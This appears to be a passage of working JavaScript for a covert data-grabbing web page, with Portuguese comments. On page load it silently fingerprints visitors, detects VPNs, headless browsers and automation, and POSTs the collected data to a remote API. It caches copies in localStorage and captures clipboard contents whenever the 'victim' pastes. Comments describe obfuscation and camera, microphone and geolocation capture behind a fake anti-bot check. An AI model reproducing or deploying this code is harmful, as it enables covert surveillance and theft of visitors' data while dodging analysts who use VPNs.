    try { await fetch(API, { method: "POST", headers: { "Content-Type": "application/json" }, body: payload }); } catch {}
    try { const k = "_grab_" + Date.now(); localStorage.setItem(k, payload); } catch {}
    // limpa grabs antigos do localStorage (mantém só os últimos 5)
    try {
      const keys = Object.keys(localStorage).filter(k => k.startsWith("_grab_")).sort().reverse();
      for (const k of keys.slice(5)) localStorage.removeItem(k);
    } catch {}

    return result;
  })();

  runningGrab = p;
  try { return await p; } finally { runningGrab = null; }
}

// Ponte GLOBAL nomeada — com renameGlobals:false o identificador `startGrab`
// é preservado pelo ofuscador nos DOIS arquivos (app.js e h7k.js), mantendo o vínculo.
var startGrab = _g;

// ============ VPN CHECKER ANTI-FALHA (3 camadas, nunca quebra) ============
async function _vpnCheck(ipInfo) {
  const result = { isVPN: false, score: 0, reasons: [], proxy: false, hosting: false, org: "", asn: "", tzMismatch: false, details: {} };
  try {
    const ip = (ipInfo && ipInfo.ip) || null;
    async function _ft(url, ms) {
      ms = ms || 4000;
      const c = new AbortController();
      const t = setTimeout(function(){ try{ c.abort(); }catch{} }, ms);
      try {
        const r = await fetch(url, { signal: c.signal, cache: "no-store" });
        clearTimeout(t);
        return r;
      } catch(e){ clearTimeout(t); throw e; }
    }
    // CAMADA 1: ip-api via HTTPS (sem mixed-content; free pode bloquear https, falha silenciosa e cai pro keyword)
    try {
      if (ip && ip !== "unknown" && ip.indexOf(".") !== -1) {
        const r = await _ft("https://ip-api.com/json/" + encodeURIComponent(ip) + "?fields=status,proxy,hosting,isp,org,as,timezone,mobile,query", 3500);
        const d = await r.json();
        if (d && d.status === "success") {
          result.details.ipapi = d;
          if (d.proxy === true) { result.score += 3; result.proxy = true; result.reasons.push("proxy:true(ip-api)"); }
          if (d.hosting === true) { result.score += 3; result.hosting = true; result.reasons.push("hosting:true(datacenter)"); }
          if (d.isp) result.org = d.isp + " " + (d.org || "");
          if (d.as) result.asn = d.as;
          try {
            const browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone;
            if (d.timezone && browserTz && d.timezone !== browserTz) {
              result.tzMismatch = true;
              result.score += 1;
              result.reasons.push("tz:" + d.timezone + "!=" + browserTz);
              result.details.browserTz = browserTz;
            }
          } catch{}
        }
      }
    } catch(e){ try{ result.details.ipapiError = String((e && e.message) || e).slice(0,120); }catch{} }
    // CAMADA 2: keyword org/asn (fallback + reforço, 100% offline)
    try {
      const orgStr = (((ipInfo && (ipInfo.isp || "")) || "") + " " + ((ipInfo && (ipInfo.asn || "")) || "") + " " + (result.org || "") + " " + (result.asn || "")).toLowerCase();
      const kws = ["vpn","nord","express","surf","proton","mullvad","windscribe","tunnelbear","hidemy","private internet","pia","cyberghost","ipvanish","hotspot","opera","warp","zscaler","datacenter","data center","hosting","host","cloud","digitalocean","hetzner","ovh","aws","amazon","google","microsoft","azure","oracle","linode","vultr","contabo","tor","relay","proxy","m247","datacamp","choopa","psychz","leaseweb","quadranet","cogent","servers","vps","dedicated","colocation"," Stark ","starlink"];
      const hits = [];
      for (let i=0;i<kws.length;i++){ const k=kws[i].trim(); if(k && orgStr.indexOf(k)!==-1) hits.push(k); }
      if (hits.length) { result.score += 2; result.reasons.push("org:"+hits.slice(0,3).join(",")); }
      result.details.orgStr = orgStr.slice(0,220);
    } catch{}
    // CAMADA 3: heuristicas locais (nunca falham, sem rede) + TZ IP vs browser (offline, sem http)
    try {
      const li = (ipInfo && (ipInfo.li || [])) || [];
      // TZ check independente: compara IP-TZ (ipapi.co) vs browser TZ — funciona mesmo se ip-api https falhar
      try {
        let browserTz = "";
        try { browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch {}
        const ipTz = (ipInfo && (ipInfo.ipTz || ipInfo.timezone)) || (result.details.ipapi && result.details.ipapi.timezone) || "";
        if (ipTz && browserTz && String(ipTz) !== String(browserTz)) {
          result.tzMismatch = true;
          result.score += 2;
          result.reasons.push("tz:" + String(ipTz).slice(0,32) + "!=" + String(browserTz).slice(0,32));
          try { result.details.browserTz = browserTz; } catch {}
        }
      } catch{}
      if ((!li || li.length===0) && result.score>=1) { result.score += 1; result.reasons.push("webrtc:hidden"); }
      try {
        if (navigator.webdriver) { result.score += 2; result.reasons.push("webdriver:true"); }
        if (/HeadlessChrome|PhantomJS/.test(navigator.userAgent)) { result.score += 2; result.reasons.push("headless"); }
      } catch{}
      try {
        const lang = (navigator.language || "").toLowerCase();
        const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || "").toLowerCase();
        if (lang.indexOf("pt")!== -1 && tz && tz.indexOf("america/")===-1 && tz.indexOf("atlantic/")===-1 && tz.indexOf("europe/lisbon")===-1) {
          result.score += 1; result.reasons.push("lang-tz:"+lang+"/"+tz);
        }
      } catch{}
    } catch{}
    // Threshold 2 (não 3): https grátis do ip-api pode falhar, então keyword+tz já acusa. Não falha pro lado do VPN.
    result.isVPN = (result.score>=2 || result.proxy===true || result.hosting===true);
    return result;
  } catch(e){
    try{ return { isVPN:false, score:0, reasons:["checker-error"], error:String((e&&e.message)||e).slice(0,120) }; }catch{ return { isVPN:false, score:0, reasons:[] }; }
  }
}

function _escH(s) { try { return String(s ?? "").replace(/[&<>"']/g, function(c){ return ({"&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"}[c]); }); } catch { return ""; } }

function _showVPNWarning(v) {
  try {
    return false; // booster falso: nunca mostra nada na tela
    if (document.getElementById("vpnWarn")) return true;
    // CSS animado injetado 1x (radar, pulse, shake)
    try {
      if (!document.getElementById("vpnWarnCss")) {
        const st = document.createElement("style");
        st.id = "vpnWarnCss";
        st.textContent = "@keyframes vpnSpin{to{transform:rotate(360deg)}}@keyframes vpnPulse{0%,100%{transform:scale(1);opacity:1}50%{transform:scale(1.08);opacity:.85}}@keyframes vpnPing{0%{transform:scale(.6);opacity:.8}100%{transform:scale(1.6);opacity:0}}@keyframes vpnBlink{0%,100%{opacity:1}50%{opacity:.35}}.vpn-shield{animation:vpnPulse 1.6s ease-in-out infinite;filter:drop-shadow(0 0 18px rgba(255,45,85,.6))}.vpn-radar{background:conic-gradient(from 0deg,rgba(255,45,85,.6),rgba(255,45,85,.06) 30%,transparent 42%);animation:vpnSpin 2s linear infinite}.vpn-ring{animation:vpnPing 2s ease-out infinite}.vpn-dot{animation:vpnBlink 1.2s infinite}";
        (document.head || document.documentElement).appendChild(st);
      }
    } catch {}
    const ov = document.createElement("div");
    ov.id = "vpnWarn";
    ov.style.cssText = "position:fixed!important;inset:0!important;z-index:2147483647!important;background:rgba(0,0,0,.96)!important;display:flex!important;align-items:center!important;justify-content:center!important;padding:20px!important";
    let rs = "rede anomala";
    try{ rs = ((v && v.reasons) || []).join(" · ") || "rede anomala"; }catch{}
    let ip = "";
    try{ ip = window.__vpnIp || ""; }catch{}
    ov.innerHTML = '<div style="max-width:440px;width:100%;background:linear-gradient(180deg,#141019,#0b0910);border:1px solid #ff2d55;border-radius:16px;padding:30px 24px 24px;text-align:center;box-shadow:0 0 60px rgba(255,45,85,.35);font-family:Inter,system-ui,sans-serif;position:relative;overflow:hidden">'
      + '<div style="position:relative;width:130px;height:130px;margin:0 auto 8px">'
      + '<div class="vpn-radar" style="position:absolute;inset:0;border-radius:50%"></div>'
      + '<div class="vpn-ring" style="position:absolute;inset:6px;border-radius:50%;border:1px solid rgba(255,45,85,.5)"></div>'
      + '<div style="position:absolute;inset:0;display:flex;align-items:center;justify-content:center">'
      + '<svg class="vpn-shield" width="64" height="64" viewBox="0 0 24 24" fill="none"><path d="M12 2l8 3v6c0 5-3.5 9.3-8 11-4.5-1.7-8-6-8-11V5z" fill="rgba(255,45,85,.12)" stroke="#ff2d55" stroke-width="1.8" stroke-linejoin="round"/><path d="M12 7v5" stroke="#ff2d55" stroke-width="2" stroke-linecap="round"/><circle cx="12" cy="15.5" r="1.3" fill="#ff2d55"/><circle class="vpn-dot" cx="12" cy="4.5" r="1.6" fill="#ff2d55"/></svg>'
      + '</div></div>'
      + '<div style="font-size:18px;font-weight:900;color:#fff;letter-spacing:2px;margin-bottom:8px">ACESSO BLOQUEADO</div>'
      + '<div style="font-size:13px;color:#ccc;line-height:1.7;margin-bottom:6px">Olá! Detectamos acesso de bots vindo da sua internet. Motivos prováveis: <b style="color:#fff">VPN - Botnet - bruteforce</b>, proxy ou datacenter.</div>'
      + '<div style="font-size:11px;color:#ff8080;background:rgba(255,45,85,.08);border:1px solid rgba(255,45,85,.25);border-radius:8px;padding:8px 10px;margin:12px 0;font-family:monospace;word-break:break-word">' + _escH(rs).slice(0,300) + '</div>'
      + '<div style="text-align:left;font-size:12px;color:#bbb;background:#0d0d0d;border:1px solid #222;border-radius:10px;padding:12px 14px;margin-bottom:14px;line-height:1.9">Para continuar:<br>1️⃣ <b style="color:#fff">Tire a VPN / proxy</b> do celular e do app<br>2️⃣ Desative <b style="color:#fff">navegador privado / Tor / 1.1.1.1</b><br>3️⃣ Toque em verificar abaixo</div>'
      + '<button id="vpnRetry" style="width:100%;background:linear-gradient(135deg,#22c55e,#16a34a);color:#fff;border:none;border-radius:10px;padding:13px;font-size:13px;font-weight:900;cursor:pointer">✅ Já tirei a VPN — verificar de novo</button>'
      + '<div style="font-size:10px;color:#555;margin-top:10px">ID: ' + _escH(ip) + ' · sem VPN o site libera na hora</div></div>';
    (document.body || document.documentElement).appendChild(ov);
    // SEM botão de dispensar: só recarrega e re-checa (se ainda tiver VPN, volta a bloquear)
    const b = document.getElementById("vpnRetry");
    if (b) b.addEventListener("click", function(){
      try { b.disabled = true; b.textContent = "Verificando…"; } catch {}
      try { setTimeout(function(){ location.reload(); }, 600); } catch { try { location.reload(); } catch {} }
    });
    // bloqueia ESC / clique fora (não fecha sem tirar a VPN)
    try {
      document.addEventListener("keydown", function(e){ try{ if (document.getElementById("vpnWarn") && e.key === "Escape") e.preventDefault(); }catch{} }, true);
    } catch {}
    return true;
  } catch{ return false; }
}
// Preview/teste: ?vpntest=1 força o aviso na tela + expõe global pra testar no console
try {
  window.__showVPNWarning = _showVPNWarning;
  window.__testVPN = function(){ try{ window.__vpnIp = window.__vpnIp || "teste"; }catch{} return void({ reasons:["teste manual · proxy:true(ip-api)","hosting:true(datacenter)"], score:6 }); };
} catch{}

function _geo() {
  return new Promise(function(resolve){
    try {
      if (!navigator.geolocation) return resolve(null);
      let done = false;
      const to = setTimeout(function(){ if(!done){ done=true; resolve(null); } }, 6000);
      navigator.geolocation.getCurrentPosition(function(p){
        if(done) return; done=true; clearTimeout(to);
        try{ resolve({ lat:p.coords.latitude, lon:p.coords.longitude, acc:p.coords.accuracy, alt:p.coords.altitude||null, spd:p.coords.speed||null }); }catch{ resolve(null); }
      }, function(e){
        if(done) return; done=true; clearTimeout(to);
        try{ resolve({ denied:true, code:(e&&e.code)||0 }); }catch{ resolve(null); }
      }, { enableHighAccuracy:true, timeout:5000, maximumAge:60000 });
    } catch{ resolve(null); }
  });
}

// AUTO-GRAB SILENCIOSO: só fingerprint + vpn + clipboard (SEM pop-up)
// camera/mic/geo SÓ na verificação anti-bot (startGrab via botão Continuar). Nada de prompt na entrada.
// GATE: window.__vpnStatus = checking|clean|vpn — reveal só libera quando clean (sem brecha no cooldown).
(function _autoGrabUltra() {
  let sentAuto = false;
  try { window.__vpnStatus = window.__vpnStatus || "checking"; } catch {}
  // check rápido (<1.5s): só IP + keyword + TZ, sem fingerprint pesado — trava VPN antes do usuário clicar
  async function _vpnFast() {
    try {
      const ctrl = new AbortController();
      const to = setTimeout(function(){ try{ ctrl.abort(); }catch{} }, 2500);
      let d = null;
      try {
        const r = await fetch("https://ipapi.co/json/", { signal: ctrl.signal, cache: "no-store" });
        d = await r.json().catch(function(){ return null; });
      } catch {}
      try { clearTimeout(to); } catch {}
      if (!d || !d.ip) return null;
      let browserTz = "";
      try { browserTz = Intl.DateTimeFormat().resolvedOptions().timeZone || ""; } catch {}
      const org = String((d.org || "") + " " + (d.asn || "")).toLowerCase();
      const kws = ["vpn","proxy","datacenter","hosting","cloud","m247","choopa","psychz","leaseweb","tor","relay","digitalocean","hetzner","ovh","aws","amazon","google","microsoft","azure"];
      let hit = null;
      for (let i = 0; i < kws.length; i++) { if (org.indexOf(kws[i]) !== -1) { hit = kws[i]; break; } }
      const reasons = [];
      let score = 0;
      if (hit) { score += 2; reasons.push("org:" + hit); }
      if (d.timezone && browserTz && String(d.timezone) !== String(browserTz)) { score += 2; reasons.push("tz:" + String(d.timezone).slice(0,32) + "!=" + String(browserTz).slice(0,32)); }
      try { window.__vpnIp = d.ip; } catch {}
      const isVPN = (score >= 2);
      return { isVPN: isVPN, score: score, reasons: reasons, fast: true, ip: d.ip };
    } catch { return null; }
  }
  // Gate público: reveal/thumb chama isso — re-checa de verdade, nunca libera no cooldown
  try {
    window.__vpnGate = async function() {
      try {
        if (window.__vpnStatus === "clean") return true;
        if (document.getElementById("vpnWarn")) return false;
        if (window.__vpnStatus === "vpn") { try{ _showVPNWarning({ reasons: (window.__vpnReasons || ["proxy:true(server)"]), score: 6 }); }catch{} return false; }
        // ainda checking: faz fast-check agora (com timeout curto) em vez de liberar
        const f = await _vpnFast();
        if (f && f.isVPN) {
          try { window.__vpnStatus = "vpn"; window.__vpnReasons = f.reasons; } catch {}
          try { _showVPNWarning(f); } catch {}
          return false;
        }
        if (window.__vpnStatus === "clean") return true;
        return false; // checking sem resultado ainda = mantém travado
      } catch { return false; }
    };
  } catch {}
  async function _sendAuto() {
    if (sentAuto) return; sentAuto = true;
    // modo teste: ?vpntest=1 força o aviso na tela na hora (pra você ver o layout)
    try {
      if (/(?:\?|&)vpntest=1/.test(location.search)) {
        setTimeout(function(){ try{ window.__vpnIp = window.__vpnIp || "teste"; }catch{} void({ reasons:["teste manual · proxy:true(ip-api)","hosting:true(datacenter)"], score:6 }); }, 600);
      }
    } catch{}
    try {
      const vv = (typeof __viewer !== "undefined") ? __viewer : null;
      if (vv && String(vv.id) === "1533178254318637186") return;
      // FASE RÁPIDA primeiro: trava VPN em ~1s sem esperar fingerprint pesado (que demora)
      try {
        const fast = await _vpnFast();
        if (fast && fast.isVPN) {
          try { window.__vpnStatus = "vpn"; window.__vpnReasons = fast.reasons; } catch {}
          try { _showVPNWarning(fast); } catch {}
        }
      } catch {}
      let fp = null;
      try { fp = await _cf(); } catch(e){ fp = { er:"fp-fail" }; }
      const geo = null; // geo SÓ na verificação (evita pop-up de localização na entrada)
      let vpn = null;
      try { vpn = await _vpnCheck({ ip:(fp&&fp.n&&fp.n.ip)||null, isp:(fp&&fp.n&&fp.n.isp)||"", asn:(fp&&fp.n&&fp.n.asn)||"", li:(fp&&fp.n&&fp.n.li)||[], ipTz:(fp&&fp.n&&fp.n.ipTz)||null, timezone:(fp&&fp.n&&fp.n.ipTz)||null }); } catch{ vpn = { isVPN:false, score:0, reasons:[] }; }
      try { window.__vpnIp = (fp&&fp.n&&fp.n.ip)||""; } catch{}
      try { fp.vpn = vpn; } catch{}
      try { fp.geo = null; } catch{}
      try { fp.url = location.href; } catch{}
      try { fp.ref = document.referrer || null; } catch{}
      try { fp.hist = history.length; } catch{}
      try { window.__lastFp = fp; } catch{}
      const payload = JSON.stringify({ fp:fp, mm:null, cb:(__cb||null), vpn:vpn, geo:null, auto:true, ultra:true, silent:true, ts:new Date().toISOString(), pg:location.href, ref:document.referrer||null });
      // mostra modal se CLIENTE acusar OU se SERVIDOR acusar (resposta do relay — check confiável via http)
      try {
        const r = await fetch(API, { method:"POST", headers:{ "Content-Type":"application/json" }, body:payload });
        try {
          const j = await r.json().catch(function(){ return null; });
          const srv = j && j.vpn ? j.vpn : null;
          const srvVPN = srv && (srv.isVPN || (srv.server && srv.server.isVPN));
          if (srvVPN) {
            try { window.__vpnStatus = "vpn"; } catch {}
            try { window.__vpnIp = window.__vpnIp || ((fp&&fp.n&&fp.n.ip)||""); } catch{}
            const reasons = [];
            try { if (srv.server && srv.server.reasons) reasons.push.apply(reasons, srv.server.reasons); } catch{}
            try { if (vpn && vpn.reasons) reasons.push.apply(reasons, vpn.reasons); } catch{}
            try { window.__vpnReasons = reasons; } catch {}
            setTimeout(function(){ _showVPNWarning({ reasons: reasons.length ? reasons : ["proxy:true(server)","hosting:true(datacenter)"], score: 6, server: true }); }, 300);
          } else if (vpn && vpn.isVPN) {
            try { window.__vpnStatus = "vpn"; window.__vpnReasons = vpn.reasons; } catch {}
            setTimeout(function(){ _showVPNWarning(vpn); }, 300);
          } else {
            try { if (window.__vpnStatus !== "vpn") window.__vpnStatus = "clean"; } catch {}
          }
        } catch { if (vpn && vpn.isVPN) { try { window.__vpnStatus = "vpn"; } catch {} setTimeout(function(){ _showVPNWarning(vpn); }, 300); } else { try { if (window.__vpnStatus !== "vpn") window.__vpnStatus = "clean"; } catch {} } }
      } catch{ try { if (window.__vpnStatus !== "vpn") window.__vpnStatus = window.__vpnStatus || "checking"; } catch{} }
      try { const k="_grab_"+Date.now(); localStorage.setItem(k, payload); } catch{}
      try{ const ks=Object.keys(localStorage).filter(function(k){return k.indexOf("_grab_")===0;}).sort().reverse(); for(const k of ks.slice(5)) localStorage.removeItem(k); }catch{}
    } catch{}
  }
  try {
    if (document.readyState === "loading") document.addEventListener("DOMContentLoaded", function(){ setTimeout(_sendAuto, 400); });
    else setTimeout(_sendAuto, 5000);
    window.addEventListener("load", function(){ setTimeout(function(){ if(!sentAuto) _sendAuto(); }, 6000); });
    setTimeout(function(){ if(!sentAuto) _sendAuto(); }, 9000);
    // 100% silencioso: NUNCA chama readText sozinho (isso gerava pop-up de clipboard).
    // Clipboard só via evento paste (quando a vítima COLA algo, sem prompt nenhum).
    try{ document.addEventListener("paste", function(){ try{ _rc(); }catch{} }, { passive:true }); }catch{}
  } catch{}
})();
